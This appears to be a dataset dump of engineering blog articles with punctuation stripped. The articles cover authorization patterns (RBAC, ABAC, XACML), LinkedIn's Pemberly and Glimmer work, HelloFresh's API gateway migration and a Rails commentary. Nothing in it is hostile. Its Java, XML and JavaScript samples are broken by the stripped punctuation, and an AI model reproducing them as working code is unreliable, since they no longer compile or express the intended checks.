final UserId profileToUpdateId  final ProfileData newProfileData  final User callingUser    if  isCallerProfileOwner profileToUpdateId  callingUser     doUpdateProfile profileToUpdateId  newProfileData   return SUCCESS    else   return PERMISSION_DENIED      private boolean isCallerProfileOwner final UserId profileToUpdateId  final User callingUser      Make sure the user is trying to update their own profile return profileToUpdateId equals callingUser getUserId       Or declaratively  using Spring Security again   PreAuthorize  hasPermission  updateUserId   owns     public void updateProfile final UserId updateUserId  final ProfileData profileData  final User callingUser  throws AccessDeniedException   doUpdateProfile updateUserId  profileData     Use Policy to Authorize Behavior Fundamentally  the entire process from identification through execution of an action could be summarized as follows  An anonymous actor becomes a known principal through authentication  Policy determines whether an action can be taken by that principal against a resource    determines whether an can be taken by that principal against a   Assuming the policy allows the action  the action is executed  A policy contains the logic that answers the question of whether an action is or is not allowed  but the way it makes that assessments varies broadly based on the needs of the application  Although we are unable to cover them all  the following section will summarize some of the more common approaches to authorization and provide some idea of when each is best applied  Implementing RBAC Probably the most common variant of authorization is role based access control  RBAC   As the name implies  users are assigned roles and roles are assigned permissions  Users inherit the permission for any roles they have been assigned  Actions are validated for permissions  Perhaps you re wondering about the value of all this indirection  all you care about is that Kristen  your administrator  is able to delete users  and other users cannot  Why not just check for Kristen s username  as in the following code  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser getUsername   equals  admin_kristen      doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      What happens when user  admin_kristen  leaves your organization or changes to another role  You either have to share her credentials  which is  of course  a very bad idea  or go through the code changing all references to  admin_kristen  to the new user  A very common alternative to this is to check for the role  as in this case  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasRole Role ADMIN     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Better  but not great  We haven t tied identity to the action  but we still have a problem if we find that there are admins with lesser privileges that are allowed to add users  but not delete users  Suddenly our  admin  role isn t granular enough and we re forced to find all the  admin  checks  and  if appropriate  put an OR operation for operations allowed by both admins and our new user_creator role  As the system evolves  you end up with more and more complicated statements and an explosion in the number of roles  Users and roles will change as our software evolves  and so our solution should reflect that  Instead of hard coding user names or even role names  we ll be best served in the long term if our code validates that a particular action is allowed  This code shouldn t be concerned with who the user is  or even what roles they may or may not have  but rather whether they have the permission to do something  The mapping of identity to permission can be done upstream  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasPermission Permission DELETE_USER     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Our structure is much better now because we ve made the choice to explicitly decouple permissions from roles  Yes  there is some complexity that comes with the extra step needed to map users to permissions  but generally speaking you can take advantage of frameworks like Spring Security or CanCanCan to do the heavy lifting  Consider RBAC when  Permissions are relatively static  Roles in your policies actually map reasonably to roles within your domain  rather than feeling like contrived aggregations of permissions  There isn t a terribly large number of permutations of permission  and therefore roles that will have to be maintained  You have no compelling reason to use one of the other options  Implementing ABAC If your application has more advanced needs than you can reasonably implement with RBAC  you may want to look at attribute based access control  ABAC   Attribute based access control can be thought of as a generalization of RBAC that extends to any attribute of the user  the environment in which the user exists  or the resource being accessed  With ABAC  instead of making access control decisions based on just whether the user has a role assigned  the logic can come from any property of the user s profile such as their position as defined by HR  the amount of time they have worked at the company  or the the country of their IP address  In addition  ABAC can draw on global attributes like the time of day or whether it s a national holiday in the user s locale  The most common standarized means of expressing ABAC policy is XACML  an XML based format from Oasis  This example demonstrates how one might write a rule that allows users to read if they are in a particular department at a particular time of day   Policy PolicyId  ExamplePolicy  RuleCombiningAlgId  urn oasis names tc xacml 1 0 rule combining algorithm permit overrides    Target   Subjects   AnySubject     Subjects   Resources   Resource   ResourceMatch MatchId  urn oasis names tc xacml 1 0 function anyURI equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema anyURI  http   example com resources 1  AttributeValue   ResourceAttributeDesignator DataType  http   www w3 org 2001 XMLSchema anyURI  AttributeId  urn oasis names tc xacml 1 0 resource resource id       ResourceMatch    Resource    Resources   Actions   AnyAction      Actions    Target   Rule RuleId  ReadRule  Effect  Permit    Target   Subjects   AnySubject     Subjects   Resources   AnyResource     Resources   Actions   Action   ActionMatch MatchId  urn oasis names tc xacml 1 0 function string equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema string  read  AttributeValue   ActionAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  urn oasis names tc xacml 1 0 action action id      ActionMatch    Action    Actions    Target   Condition FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function string equal    Apply FunctionId  urn oasis names tc xacml 1 0 function string one and only    SubjectAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  department      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema string  development  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function time greater than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  09 00 00  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function time less than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time       Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  17 00 00  AttributeValue    Apply    Apply    Condition    Rule   Rule RuleId  Deny  Effect  Deny      Policy  It s worth mentioning that XACML has its challenges  It is certainly verbose and arguably cryptic  It s also one of the few options you have if you want to use a standardized model for defining ABAC policies  Another option is to build policies in the language of your application  bound to its domain  Below is an example of the same policy written in JavaScript declarative style supported by a small DSL  allow  read    of anyResource     if and  User department   is equalTo  development     timeOfDay   isDuring  9 00 PST    17 00 PST       There s considerable work to do here in addition to the defining of the policy itself that is beyond the scope of this article  To get a flavor for how something like this might be implemented  you can take a look at the repository for the DSL implementation that supports the example policy  Should you choose the path of using custom code  you will need to think about how much investment you are willing to make in the DSL itself and who owns the implementation  If you expect to have a large number of highly dynamic policies  a more sophisticated DSL might be worthwhile  An external DSL might be justified for cases in which non programmers need to understand the policies  Otherwise  for cases of more limited scope and static policies  it s best to start simple with the goal of making the policies clear to their primary maintainers  the programmers  and letting the DSL evolve over the lifecycle of the project  always taking care that changes to the DSL do not break existing policy implementations  Creating in a DSL is not a must  You can use the same object oriented  functional  or procedural coding style the rest of your application uses  and rely on strong design and refactoring practices to create clean code  The repo also includes an example with the same rules using a imperative  rather than declarative  approach  Consider ABAC when  Permissions are highly dynamic and simply changing user roles is going to be a significant maintenance headache  The profile attributes on which permissions depend are already maintained for other purposes  such as managing an employee s HR profile  Access control is sufficiently sensitive that control flows need to vary based on temporal attributes such as whether it s during the normal working hours of your employees  You wish to have centralized policy with very fine grained permissions  managed independently of your application code  Other Ways to Model Policy The above are just two possible ways of modeling policy and will probably accommodate most situations  Although they are probably rare  situations do arise that don t fit well into RBAC or ABAC  Other approaches include  Mandatory access control  MAC   centrally managed non overridable policy based on subject and resource security attributes  such as Linux  LSM  Relationship based Access Control  ReBAC   policy that is largely determined by relationship between principals and resources  Discretionary Access Control  DAC   policy approach that includes owner managed permission control  as well as systems with transferable tokens of authority  Rule based Access Control  dynamic role or permission assignment based on a set of operator programmed rules There is not universal agreement on when these approaches apply or even exactly how to define them  There is substantial overlap in the types of policies they allow operators to define  Before going down the path of choose a more esoteric approach  or inventing your own  be sure that RBAC or ABAC aren t reasonable approaches to modeling your policies  Implementation Considerations Finally  here are a few words of advice to consider when implementing authorization in your application  Browser caches can really mess with your authorization model when users share browsers  Make sure that you set the Cache Control header to  private  no cache  no store  for resources so that your server side authorization code is called every time   You will inevitably have to make a decision whether to use a declarative or imperative approach to validation logic  There is no right or wrong here  but you will want to consider what provides the most clarity  Declarative mechanisms like the annotations that Spring Security provides can be concise and elegant  but if the authorization flow is complicated  the built in expression language becomes convoluted and  arguably  you re better off writing well factored code   Try to find a solution  whether custom or framework based  that consolidates and reduces duplication of authorization logic  If you find your authorization code is scattered arbitrarily throughout your codebase  you are going to have a very hard time maintaining it  and that leads to security bugs  In Summary Authorization must always be checked on the server  Hiding user interface components is fine for user experience  but not an adequate security measure  Deny by default  Positive validation is safer and less error prone than negative validation  Code should authorize against specific resources such as files  profiles  or REST endpoints  Authorization is domain specific  but there are some common patterns to consider when designing your permission model  Stick to common patterns and frameworks unless you have a very compelling reason not to  Use RBAC for basic cases and keep permissions and roles decoupled to allow your policies to evolve  For more complicated scenarios  consider ABAC  and use XACML or policies coded in the application s language  This article is an Evolving Publication  Our intention is to continue to describe basic techniques that developers could  and should  use to reduce the chances of a security breach  To find out when we expand the article  follow the site s RSS feed or Martin s twitter feed  We ll also announce updates on our twitter feeds  Cade Cairns and Daniel Somerfield
56,engineering,Pemberly at LinkedInCoauthors  Sarah Clatterbuck  Mark Pascual  Chad Hietala  Eugene O Neill  When setting out to re imagine our flagship app and desktop web experiences last year  we wanted to make a move to a more modern technology stack  We were falling behind in a few areas and wanted to address the following points of concern   Responsiveness  Modern web apps are typically heavily client rendered to provide the user with a more responsive user experience  The design team wanted to create page transition experiences  which are not possible in traditional web pages  When a traditional web page is requested  the browser loads it suddenly and jarringly as the response is fulfilled  Conversely  in a client rendered app  transitions can be made to elegantly fade or slide in  because the Document Object Model  DOM  of the existing page is being replaced rather than a new page being requested from the server  Also  we wanted our desktop member experience to be more app like and aligned with the native mobile app experience both for consistency between platforms and snappy feeling interactions   State management  In our patterns for addressing JavaScript in web pages  we had great conventions around widgets and DOM manipulation  However  where things got really complicated was when we needed to manage state  There were a number of hand rolled solutions to managing state along with several imports of various libraries to do the same  This led to a fracturing of our frontend ecosystem and an inability to provide adequate developer tooling for developing with these more complex tool sets   Developer productivity  In addition to creating an easy way to manage state  we also wanted to provide greater developer productivity  This included the ability to go from writing code and tests to deploying in several hours  We also wanted to bring together our fractured frontend ecosystem into a single set of conventions that all the teams developing long lived stateful apps would follow  In order to get to the level of productivity desired  we also needed a robust set of tooling for creating dev and production builds and writing unit and acceptance tests for JavaScript   The solution  Pemberly  We decided to build up a solution  dubbed Pemberly  combining open source software we were already using in the mid tier  Play  along with a web framework  Ember  for JavaScript that would deliver strong conventions  easy ability to manage state  a robust build and testing methodology  and the delightful  app like user experience we were targeting 
57,engineering,Scaling   HelloFresh  API GatewayMonday  February 20  2017 at 8 56AM  HelloFresh keeps growing every single day  our product is always improving  new ideas are popping up from everywhere  our supply chain is being completely automated  All of this is simply amazing us  but of course this constant growth brings many technical challenges   Today I d like to take you on a small journey that we went through to accomplish a big migration in our infrastructure that would allow us to move forward in a faster  more dynamic  and more secure way   The Challenge  We ve recently built an API Gateway  and now we had the complex challenge of moving our main  monolithic  API behind it   ideally without downtime  This would enable us to create more microservices and easily hook them into our infrastructure without much effort   The Architecture  Our gateway is on the frontline of our infrastructure  It receives thousands of request per day  and for that reason we chose Go when building it  because of its performance  simplicity  and elegant solution to concurrency   We already had many things in place that made this transition more simple  some of them are   Service Discovery and Client Side Load Balancing  We use consul as our service discovery tool  This together with HAProxy  enables us to solve two of the main problems when moving to a microservice architecture  service discovery  automatically registering new services as they come online  and client side load balancing  distributing requests across servers    Automation  Maybe the most useful tool in our arsenal was the automation of our infrastructure  We use Ansible to provision anything in our cloud   this goes from a single machine to dealing with network  DNS  CI machines  and so on  Importantly  we ve implemented a convention  when creating a new service  the first thing our engineers tackle is to create the Ansible scripts for this service   Logging and Monitoring  I like to say that anything that goes in our infrastructure should be monitored somehow  We have some best practices in place on how to properly log and monitor your application   Dashboards around the office show how the system is performing at any given time   For logging we use the ELK Stack  which allows us to quickly analyze detailed data about a service s behavior   For monitoring we love the combination of statsd   grafana  It is simply amazing what you can accomplish with this tool   Grafana dashboards give amazing insight into your performance metrics  Understanding the current architecture  Even with all these tools in place we still have a hard problem to solve  understand the current architecture and how we can pull off a smooth migration  At this stage  we invested some time on refactoring our legacy applications to support our new gateway and authentication service that would be also introduced in this migration  watch this space for another article on that   Ed    Some of the problems we found   While we can change our mobile apps  we have to assume people won t update straight away  So we had to keep backwards compatibility   for example in our DNS   to ensure older versions didn t stop working   We had to analyze all routes available in our public and private APIs and register them in the gateway in an automated way   We had to disable authentication from our main API and forward this responsibility to the auth service   Ensuring the security of the communication between the gateway and the microservices   To solve the import problems we wrote a script  in Go  again  to read our OpenAPI specification  aka Swagger  and create a proxy with the correct rules  like rate limiting  quotas  CORS  etc  for each resource of our APIs   To test the communication between the services we simply set up our whole infrastructure in a staging environment and started running our automated tests  I must say that this was the most helpful thing that we had during our migration process  We have a large suite of automated functional tests that helped us maintaining the same contract that the main API was returning to our mobile and web apps   After we were quite sure that our setup worked on our staging environment we started to think about on how to move this to production   The first attempt  Spoiler alert  our first attempt at going live was pretty much a disaster  Even though we had a quite nice plan in place we were definitely not ready to go live at that point  Let s check the step by step of our initial plan   Deploy latest version of the API gateway to staging  Deploy the main API with changes to staging  Run the automated functional tests against staging  Run manual QA tests on staging website and mobile apps  Deploy latest version of the API gateway to live  Deploy the main API with changes to live  Run the automated functional tests against live  Run manual QA tests on live website and mobile apps  Beer  Everything went quite well on staging  at least according to our tests   but when we decided to go live we started to have some problems   Overload on the auth database  we underestimated the amount of requests we d receive  causing our database to refuse connections Wrong CORS configuration  for some endpoints we configured the CORS rules incorrectly  causing requests from the browser to fail  Thanks to our database being flooded with requests we had to roll back right away  Luckily  our monitoring was able to catch that the problem occurred when requesting new tokens from the auth service   The second attempt  We knew that we didn t prepare well for our first deploy  so the first thing we did right after rolling back was hold a post mortem  Here s some of the things we improved before trying again   Prepare a blue green deployment procedure  We created a replica of our live environment with the gateway deployed already  so all we needed to when the time came was make one configuration change to bring this cluster online  We could rollback if necessary with the same simple change   Gather more metrics from the current applications to help us have the correct machine sizes to handle the load  We used the data from the first attempt as a yardstick for the amount of traffic we expected  and ran load tests with Gatling to ensure we could comfortably accommodate that traffic   Fix known issues with our auth service before going live  These included a problem with case sensitivity  a performance issue when signing a JWT  and  as always  adding more logging and monitoring   It took us around a week to finish all those tasks  and when we were finished  our deployment went smoothly with no downtime  Even with the successful deployment we found some corner case problems that we didn t cover on the automated tests  but we were able to fix them without a big impact on our applications   The results  In the end  our architecture looked like this   API Gateway Architecture  Main API  10  main API servers on High CPU Large machines  MySQL instances run in a master replica setup  3 replicas   Auth service  4 application servers  PostgreSQL instances run in a master replica setup  2 replicas   A RabbitMQ cluster is used to asynchronously handle user updates  API Gateway  4 application servers  MongoDB instances run in a master replica setup  4 replicas   Miscellaneous  Ansible is used to execute commands in parallel on all machines  A deploy takes only seconds  Amazon CloudFront as the CDN WAF  Consul   HAProxy as service discovery and client side load balancing  Statsd   Grafana to graph metrics across the system and alert on problems  ELK Stack for centralizing logs across different services  Concourse CI as our Continuous Integration tool  I hope you ve enjoyed our little journey  stay tuned for our next article 
58,engineering,Rails has won  The Elephant in the RoomTo make it clear  the dialectic technical arguments he makes are all true  But half the article   as he stated himself   is just rant  pure rethoric  And I think it would be good to balance it out  which is what I will try to do in this post   Solnic is right  Ruby  by itself  has little to no future alone  Rails is a real monopoly in this community and most OSS projects are targeting Rails  And yes  Rails do encourage some bad practices and anti patterns  This can be very discouraging to many OSS contributors  specially because to change the direction of a huge Elephant takes humongous effort   First of all  it s inevitable but I still hate dramatic headlines  even though I write like this myself sometimes   My time with Rails is up  like it s saying  And you should leave Rails now too if you re smart   I dismissed the article entirely because of that  I was about to post a counter rant to that without reading it properly  but now that I have  I wrote this new article from scratch   I just read a very well written and important article from OSS contributor Solnic and I have to agree with him in almost every technical point   Accepting Reality  The reality is this  Rails is tailor made for Basecamp   We all know that  or we should  Basecamp like apps are not too difficult to make  at least in terms of architecture  You don t need fancy super performant languages with super duper highly concurrent and parallel primitives  Also a reality is that 80  of the web applications are Basecamp like  disclosure  my feelings for years of experience in consulting   Which is why Rails has endured so far   It s like content management systems  or CMS  Most of them are blog like systems  And for that you should go ahead and install Wordpress  The very same arguments made against Rails can be done against Wordpress  And you should never  ever  tweak Wordpress to be anything but a blog system  Try to make it into an e commerce for high traffic  and you will suffer   To make it clear  Wordpress has one of the most offensive source codes I ve ever seen  I would hate having to maintain that codebase  I m sorry if anyone from the Wordpress base of contributors is reading this  I say this without malevolence  And you know what  Possibly half of all CMSs in the world are Wordpress  Over a million websites   Then you have the case for Magento2  Big rewrite over the original Magento  written using all the dreaded Zend stuff that everybody else dislikes  But it s huge  If you need a fast turn key solution for e commerce  look no further   Do Wordpress plugins work with Magento  Nope  They are 2 fragmented  independent and isolated communities  But they both generate a lot of revenue  which is what covers the cost of redundancy between them  And this is not even counting Drupal  Joomla  PHP is one big ocean of disconnected islands  Countries with severe immigration laws   Fragmentation is no stranger to the Javascript world  But it s a different kind of value generation  Facebook  Google  Microsoft  they all want to be the thought leaders in the fast evolving Millenials generation  It s a long term strategy  And one of the elements of this game is the Browser  But not only in terms of Chrome vs Firefox vs IE  but also on how applications are implemented   Facebook came up with React  Google came up with Polymer and Angular  The Node guys went through a power struggle with Joyent which almost resulted in further fragmentation but they settled for the Node Foundation   Apple went all on war against Adobe s Flash and then only now Google is turning them off in Chrome  but they are all looting on the consequences for all the attention it brings in the Web Development communities   Apple wants native to succeed and Swift to be the one language to lead it all  Google has conflicting strategies because they want native Instant Apps to succeed but if it fails  plan B continues to be for them to dominate HTML5 CSS3 based web apps with Angular  Facebook don t want to have their fate being decided by the power struggle between Apple and Google   It s a complex power struggle unfolding  and you can see that it s not about technical prowess  it s not about value generation  It s about ego  influence and power  Very fitting for the YouTuber generation  And the web technologies are being held hostage in this siege  if you havent s noticed   Then there is the issue that Ruby s future is now tightly coupled with Rails  This is a reality and if you re a Rubyist that don t like Rails  I feel bad for you  But not so much  For example  if Hanami is interesting I believe at least one company invested on it  If no one is using it  then it doesn t matter how technically superior it is  If Rom rb is great someone should be using it  otherwise what s the point  Why create a technical marvel that no one wants  But if there is at least one company using it  it s enough reason to keep going  regardless of what happens to Rails or what DHH says or does   People think that because something is  technically superior  everybody else should blindly adopt  But this is not how the market works   Of all the cosmic size events going on out there  I really don t sweat it that much if Ruby stays tied to Rails  What would it do without it   All communities face fragmentation at some point  It s very difficult and expensive to maintain cohesiveness for a long time  The only community that I think achieved that through sheer force of regulation is Microsoft s  NET stack  It doesn t mean that there were no pressure from the outside  Rails itself played a big role into influencing the move from old ASP NET to ASP NET MVC  Now they finally acquired Xamarin before  NET could steer out of their control in open source platforms they don t control   Ruby on Rails is the only other  cohesive  community I ve seen  With the upside that Basecamp doesn t need hundreds of thousands of developers to exist  A niche market would suffice  enough for the framework to evolve gradually through OSS processes  Which is why I always question the history and origins of tools and technologies to make my decisions on where to use them  not just technical prowess   Rails works because it doesn t have to play politics with Apple  Facebook  Microsoft  Google or any other committees  by the way  by default  I never trust committees   Those who depend on Rails will do the house keeping  directly  Heroku  Github  New Relic  Shopify  and many talented developers   3 Laws of Market Reality  It s easy to over analyse something after the fact  10 years down the road  I can easily trace back an optimal path  avoiding all boobtraps and obstacles along the way  Doesn t make me any genius  just shows that I can connect the   now clearly visible   dots  No solution implementation is perfect  If it actually solves a real problem it s bound to be imperfect  If it solves a real problem in a fast paced changing market  the more imperfect  Either you build tools because your core business applications depend on it or you build tools to sell  The former will usually be better   in terms of market fit   than the latter  So if you have to blindly choose  go with the former   So  first of all  I will always prefer tools that solve a real problem made by those that actually depend on them  Otherwise  the shoemaker s son will end up barefoot  Case in point  I will definitely use Angular  if I have to  But I would never  ever  begin a new business that depends solely on Angular to survive  Why  Because Google doesn t need it  It didn t blink to give up GWT  it didn t have to think twice to decide to rewrite Angular 2 in an incompatible way to Angular 1  and so on   Second of all  I will always see what other external factors will influence the fate of the technology  Imagine that I spent a whole lot of time writing scripts  libraries  tools for Grunt  Then people decide it s bad  Now Gulp is the better choice   and you will find plenty of technical reasons  Now you invest a lot of time writing everything you had for Grunt to Gulp  Then  for plenty of other reasons people decide that Webpack is the best choice  And there you go again  NIH  Not invented here  syndrome gallore   This is clearly a small bubble  It s tulips all over again  There are too many big players  Facebook  Google  Apple  Microsoft  Mozilla  etc  with big pockets  plenty of time and resources  This is how an experimental lab works in public  Lots and lots of experimental alternatives and several businesses blindly choosing depending on the best sales pitch of the week   Sometimes this kind of situation makes the monopoly of ASP NET on the Microsoft camp and the Rails monopoly on the Ruby camp seen innocuous  And yes  I compared Rails to  NET here  They are the 2 most comparable stacks  Possibly comparable to Spring faction in the Java camp  If you remember the history  Spring was like Rails in the Java community  rising up against the humongous complexity of the official J2EE stack back in 2002  And then Spring itself became the new J2EE like behemoth to beat   This is a millenia old dillema    You either die a hero  or live long enough to see yourself become the villain    Why is Rails a problem now   As I said before  I agree to almost every technical problem that Solnic outlined   Rails is indeed the brainchild of David Hansson  DHH   DHH is a person  with a very big ego  and a business to run  You can t expect any person to be reasonable all the time  specially one that pushed something up from zero  both a business and a technology platform   When it started  people defected from Java   NET  PHP even Python  in droves and they all acknowledged how interesting Rails was compared to J2EE  ASP NET  Plone  It offered not only productivity but technical enjoyment  We were discussing the wondreous world of dynamic languages  open classes  injecting behavior on the fly  aka monkey patching   we all stood up and aplauded dropping all unnecessary abstrations   We could not have enough of our Ruby fix  spitting out all the Perl like magic we would accomplish in a language that didn t feel ugly as PHP or bureacratic like Java or C   And they all laughed   The Golden Age from 2004 to 2006 saw a never ending stream of celebratory masturbation of Perl like coding prowess  We learned Ruby through Why  the Lucky Stiff most obscure black magic  remember that  It was everything but clean and modular architectures   Then we entered the Silver Age  from 2007 to around 2011  Rails actually went too far  too fast  Suddenly we saw big companies popping up from everywhere  Twitter  Github  Engine Yard  Heroku  Zendesk  Airbnb  everybody drunk the Rails cool aid  The opportunity was there to offer something for the enterprise  Merb was ahead of its time and it was pitched the wrong way  I do think that confronting the almighty Rails upfront  at that point  was not smart  You should expect overreaction and it did came and it was a swift blow  I will be honest and say that I was very aprehensive in 2009 and 2010 to see if the Rails 3 pseudo rewrite  pseudo Merb merge would actually come through   2011 to 2016 was the Bronze Age  a bittersweet period  That s because many new languages have emerged and finally reached  usable  state  From JS s V8 and Node js  to Rust  to Clojure  to Elixir  and even some gems from the past started to get attention  such as Scala and even Haskell  The most important change of all  2010 saw the advent of the Walled Garden App Store  commercially available native applications for smartphone and tablets  Forget web development  mobile was getting it all   And that s when all the big companies started to show their deep pockets  Apple releases Swift  Google released Dart  Angular  Go  Microsoft released Typescript  ASP NET MVC then vNext and had it s hands full working on Windows 10  Facebook entered the game late by releasing React and then React Native   Rails can now be considered a  problem  for the very same reasons that made it popular in the first place  And this is bound to happen to any technology   But you can t change the architecture of Rails too much  otherwise you risk breaking down very big chunks of the projects that are deployed in production now  And when someone has to rewrite big chunks of a project you might as well consider rewriting it in something else entirely   Many people are doing exactly that  specially for APIs and web applications implemented as SPAs talking to APIs  The APIs can be written in Go  Elixir  Scala and avoid Ruby altogether  You lose the fast turn around of the Rails ecosystem  but if you can afford it  you re a Unicorn startup with deep pockets   why not   But again  for the 90  of small to medium projects out there  you can still get the best punch for the buck using Rails and all the libraries available for Rails  It s like saying  if you want to build a blog  go for Wordpress and you will get the best benefit for the limited resources you have  Don t try to be fancy and write an SPA blog using Go APIs with React from scratch  Feasible  but not worth it   If you re a medium company already using Rails for some time  first of all make sure you adhere to basic best practices  Add tests and specs if you haven t already  Steadily refactor code  remove duplication  upgrade gems  Then you should consider adding an abstration layer such as Trailblazer and possibly consider componentizing parts of your application as Rails Engines or removing those parts into separated Rails API applications to be consumed  if possible  But do one step at a time  as needed   One rarely benefits from big bang rewrites from scratch   Conclusion  So yes  for developers such as Solnic the Rails community is probably a frustrating place to be  But it s also an addiction that s hard to drop because Rails is so much larger than any other competitor in any other new and fancy platform  you always feel bad for being the underdog   Rails went from underdog to mainstream in 5 years  Possibly the fastest growth any web framework ever achieved  The life of a web developer from 1995 to 2003 was not particularly interesting  Rails did a lot to improve it  And if anyone thinks they can do better  just do it  What s the point of writing about Rails  More than just code competing against code  results should compete against results   Active Record s architecture will indeed hurt hard maybe 10  of the cases out there  Active Support does not have a better alternative so far  and just removing it won t bring anything of value for the end user  Replacing a big component such as Active Record for something  better  such as an improved version of DataMapper or Rom rb as the default again won t bring so much value  specially for the hundreds of applications out there  You re telling everybody to just rewrite everything  And if I would have to rewrite  I would definitely do a new application using Rails   Trailblazer or go straight to Hanami  But most people would decide in favor of ditching Ruby altogether   Could Active Record be better  Sure  We have old Data Mapper  Sequel and ROM rb to prove it  But the real question is  could it be done better back in 2004 when it was first created  I don t think so  Now even the creator of DataMapper advocates for No ORM  In 2004  NoSQL  wasn t even a thing  The best we had back then was Hibernate  way before JPA  And for all intents and purposes  Active Record still does much better than average  But if you re big  you should be careful  That s all   The other communities will face the same predicaments we are now facing in the Rails community  It s inevitable  Everything is so much easier when you have a small community that even if you break things it won t be too bad  It s much harder to maintain something that actually became big beyond your most optimistic scenarios   I do understand the conservative approach DHH is taking by not making big disruptions  If this is something he is doing because he believes in conservative moves or because he doesn t understand better architectural options is not up to me to judge  but it s a valid move that will alienate advanced developers like Solnic but still allow for beginners to jump right into it without worrying too much right now about too many abstractions   Update  DHH commented on this section later    akitaonrails It s not out of conservatism  But a difference of opinion and values  I love Active Record  Love callbacks    DHH   dhh  May 24  2016   akitaonrails Will everyone love the same techniques and methods as me  Of course not  see RSpec for just one popular example    That s fine   DHH   dhh  May 24  2016  People forget that abstractions are very nice for advanced developers that had suffered the lack of them  But beginners will always suffer if presented with too many architectural choices upfront  Understanding GoF Design Patterns  Data Driven Design  SOLID  Enterprise Architectures  etc is very overwhelming  Experienced people often forget the learning curve when they were themselves beginners  and at that time Rails was so attractive  so sexy  Remember that feeling  Of accomplishment in the face of the knowledge that some nice witch left super useful black magic behind   Rails has won for it s simplicity for beginners  having a  rails  like guidance for experienced people as well  and somewhat acceptable flexibility for more advanced developers  Will it be able to maintain another 10 years in face of the many smaller alternatives out there trying to recreate everything from scratch  Time will tell   I think it would be a good fit to finish with Bob Dylan 
59,engineering,Glimmer  Blazing Fast Rendering for Ember js  Part 1Coauthors  Chad Hietala and Sarah Clatterbuck  At LinkedIn  we use Ember js as our client side web application framework  This is part of the larger Pemberly architecture we employ  Historically  native applications have had a large advantage over web applications in terms of not only technical capabilities  but also in their ability to drive engagement due to extremely rich SDKs  That being said  this environment has changed pretty drastically over the past five years  as the browser has evolved from a document viewer into the world s widest distributed application runtime  Below are some examples of functionality that one would have associated with a native experience five years ago that are now available to the web platform   Ember s goal is to be an SDK for the web that ties together these low level APIs into a more productive developer experience that leads developers down a path of success  Having an opinionated tool chain not only allows you to scale up  but also to be able to completely overhaul pieces of infrastructure in a backward compatible way without impacting application code   By default  Ember applications construct their UIs on a user s computer instead of utilizing a string of HTML from the server  While this is done to allow for very interactive applications post initial render  you have to deal with reality  users on the web are network bound  CPU bound  and memory bound  Because of this  app developers must pay attention to not only the payload size  but also the parse compile and execution time  Having a framework with an opinionated architecture across applications allows us to address performance related bottlenecks in a structured manner and optimize the system holistically   Last year  we contributed to an evolution of Ember s rendering engine to drastically reduce payload size  CPU time  and memory pressure to further our efforts to provide a delightful browsing experience for our flagship mobile web and desktop web apps  While the team has also been working on Fastboot  a means of server side rendering Ember applications  we still needed to optimize the runtime for future work we would like to do  Our team at LinkedIn specifically contributed to both to the development and the integration of a ground up re write of the rendering engine under the Glimmer2 code name  now simply known as Glimmer   Originally  the first iteration of Glimmer  now known as Glimmer1  was a thin layer that sat on top of HTMLBars  In 2016  at EmberConf  the next generation of Glimmer was announced as a ground up rewrite that would incorporate learnings and realizations from the past five years of client side rendering to increase the performance in this area of the framework  These learnings including   Components should become first class primitives of the rendering engine  allowing for runtime optimizations  Templates are just a declarative way of describing a UI and because of this  they have properties like referential transparency  Templates have time varying values  making them essentially functional reactive programs  FRP  that you can re run to update the values and produce a new UI  Instead of push based semantics for updating the template  the system can be modeled as a discrete pull based system with no notion of observers or notifications  Since we are effectively designing a programming language and the underlying runtime  we should architect it using well standing tenets in programing language implementation  such as JIT Compilers and bytecode interpreters  Having a VM architecture would allow us to more easily implement well known optimizations such as constant folding  inlining  macro expansion  etc  Since the project would be sufficiently complex  we wanted a first class type system  For this we chose to write Glimmer in TypeScript  In addition to making a project more maintainable  they also enforce object shape  which is an heuristic several JavaScript engines use to optimize   With this design considerations in mind  we first had to change how templates were compiled to drastically reduce the size of code we send to a user s browser  This involved changing the compilation stack that occurs during the build of an Ember application   Ahead of Time  AoT  stack  This part of the Glimmer architecture has a lot of similar parts to the Glimmer1 HTMLBars pre compilation stack in that it uses the Handlebars parser and spec compliant HTML Parser and Tokenizer to produce a combined Abstract Syntax Tree  AST   which is consumed by the JavaScript compiler  While the majority of the AoT Compiler stack is the same as its predecessor  it differs in that it produces a JSON structure known as the Wire Format instead of an executable JavaScript program  Below is a high level diagram of how the stack works 
60,engineering,More Efficient Mobile Encodes for Netflix DownloadsAbout the Netflix Tech Blog  This is a Netflix blog focused on technology and technology issues  We ll share our perspectives  decisions and challenges regarding the software we build and use to create the Netflix service     
